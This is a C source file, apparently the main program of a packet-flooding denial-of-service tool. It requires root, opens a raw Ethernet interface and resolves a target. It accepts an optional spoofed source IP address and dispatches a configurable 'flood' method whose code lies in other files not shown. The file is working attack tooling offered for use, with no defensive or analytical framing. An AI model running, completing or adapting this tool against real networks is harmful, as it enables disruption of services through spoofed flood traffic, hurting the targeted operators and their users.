/*
 * Copyright (c) 2025, oldteam. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *   this list of conditions and the following disclaimer in the documentation
 *   and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "../include/config.h"
#include "../include/methods.h"
#include "../include/interface.h"
#include "../include/utils.h"
#include "../include/random.h"

void			setup(int argc, char **argv);
void			networksetup(void);
void			methodssetup(void);
noreturn void		exithandler(int sig);

opts_t			o={0};
eth_t			*eth;
method_args_t		ma;
int			ifindex;
struct ether_addr	srcmac,dstmac;
struct in_addr		srcip4,dstip4,gateway4;
const char		*dns;
u_char			machdr[14];

int main(int argc, char **argv)
{
	INITMETHODS();

	if (argc!=2) {
		fprintf(stderr,"Usage\t%s <config>\n",argv[0]);
		printmethods();
		printmethods_random();
		exit(0);
	}

	setup(argc,argv);
	networksetup();
	methodssetup();

	printf("[%s]\tstarting flood\n", __FILE__);
	execmethod(o.OPT_METHOD,&ma);
	return 0;	/* NOTREACHED */
}

noreturn void exithandler(int sig)
{
	time_t		now;
	char		date[20];
	struct tm	*t;

	now=time(NULL);
	t=localtime(&now);
	strftime(date, sizeof(date), "%Y-%m-%d %H:%M:%S", t);
	ethclose(eth);
	printf("[%s]\tstoping flood in %s\n", __FILE__,date);
	exit(sig);
}

void setup(int argc, char **argv)
{
	time_t		now;
	char		date[20];
	struct tm	*t;
	char		err[MAXERRLEN];

	assert((geteuid()==0));
	now=time(NULL);
	t=localtime(&now);
	signal(SIGINT, exithandler);
	signal(SIGTERM, exithandler);
	signal(SIGSEGV, exithandler);

	strftime(date, sizeof(date), "%Y-%m-%d %H:%M:%S", t);
	printf("[%s]\tWELCOME \"%s\" IN %s\n",
		__FILE__,argv[0],date);
	printf("[%s]\tinit flood\n", __FILE__);

	if ((config(argv[1],&o,err))==-1) {
		printf("%s\n",err);
		abort();
	}
}

void methodssetup(void)
{
	random_set(o.OPT_RANDOM);	/* method random*/
	Srandom(random_seed_u64());	/* seed random */
	
	/* method arguments */
	ma.o=&o;			/* options */
	ma.dns=dns;			/* dns */
	ma.target=dstip4.s_addr;	/* dest ip addr */
	ma.source=srcip4.s_addr;	/* source ip addr */
	ma.fd=eth;			/* socket */
	memcpy(ma.machdr,machdr,14);	/* mac header */

	if (!validmethod(o.OPT_METHOD)) {
		printf("[%s]\tyour method id=%ld not found!\n",
			__FILE__,o.OPT_METHOD);
		abort();
	}
	printmethod(o.OPT_METHOD);
}

void networksetup(void)
{
	int		a,b,c,d,f=0;
	const char	*ip;
	char		buf[IF_NAMESIZE];

	printf("[%s]\tinterface setup...\n",
		__FILE__);
	if ((!(strcmp(o.OPT_INTERFACE,OPT_INTERFACE_NULL)))) {
		getupif(&ifindex,&srcmac,&srcip4,
			&gateway4,&dstmac,NULL);	
		assert((eth=ethopen_index(ifindex)));
	}
	else {
		getupif(&ifindex,&srcmac,&srcip4,
			&gateway4,&dstmac,o.OPT_INTERFACE);	
		assert((eth=ethopen(o.OPT_INTERFACE)));
	}

	if (((strcmp(o.OPT_SOURCE,OPT_SOURCE_NULL))))
		srcip4.s_addr=inet_addr(o.OPT_SOURCE);

	if (sscanf(o.OPT_TARGET,"%d.%d.%d.%d",&a,&b,&c,&d)!=4) {
		dns=o.OPT_TARGET;
		assert((ip=resolve_ipv4(dns)));
		assert((sscanf(ip,"%d.%d.%d.%d",&a,&b,&c,&d)==4));
	}
	else
		++f;
	assert(a>=0&&a<=255&&b>=0&&b<=255&&c>=0&&c<=255&&d>=0&&d<=255);
	dstip4.s_addr=htonl((a<<24)|(b<<16)|(c<<8)|d);
	if (f)
		dns=resolve_dns(dstip4.s_addr);

	if_indextoname(ifindex, buf);
	printf("[%s]\tinterface\t%d (%s)\n", __FILE__,ifindex,buf);
	printf("[%s]\tgateway\t\t%s\n", __FILE__,inet_ntoa(gateway4));
	printf("[%s]\tsrcip\t\t%s\n", __FILE__,inet_ntoa(srcip4));
	printf("[%s]\tdstip\t\t%s\n", __FILE__,inet_ntoa(dstip4));
	printf("[%s]\tsrcmac\t\t%s\n", __FILE__,ether_ntoa(&srcmac));
	printf("[%s]\tdstmac\t\t%s\n", __FILE__,ether_ntoa(&dstmac));
	printf("[%s]\tdns\t\t%s\n", __FILE__,dns);

	memcpy(machdr,&dstmac,6);
	memcpy(machdr+6,&srcmac,6);
	machdr[12]=0x08,machdr[13]=0x00;
	
	printf("[%s]\tmacheader\t", __FILE__);
	for (a=0;a<14;a++)
		printf("%02x",machdr[a]);
	putchar(0x0a);

}
